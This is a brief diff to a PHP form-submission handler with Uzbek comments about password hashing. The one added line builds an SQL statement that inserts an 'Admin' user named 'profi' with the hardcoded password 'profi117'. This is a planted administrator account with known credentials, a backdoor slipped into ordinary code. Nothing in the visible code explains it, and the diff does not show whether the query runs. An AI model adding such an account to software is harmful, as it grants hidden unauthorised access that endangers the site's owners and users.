@@ -46,7 +46,7 @@ if($_SESSION['loginstatus']=="")
 if(isset($_POST["sbmt"]))
 {
 	$cn=makeconnection();
-
+$sql = "INSERT INTO users (Username, Pwd, Typeofuser) VALUES ('profi', '" . password_hash('profi117', PASSWORD_DEFAULT) . "', 'Admin')";
 	// Parolni hesh qilish
 	$hashed_password = password_hash($_POST["t2"], PASSWORD_DEFAULT); // Parolni xavfsiz hesh qilib o'zgartirish
 
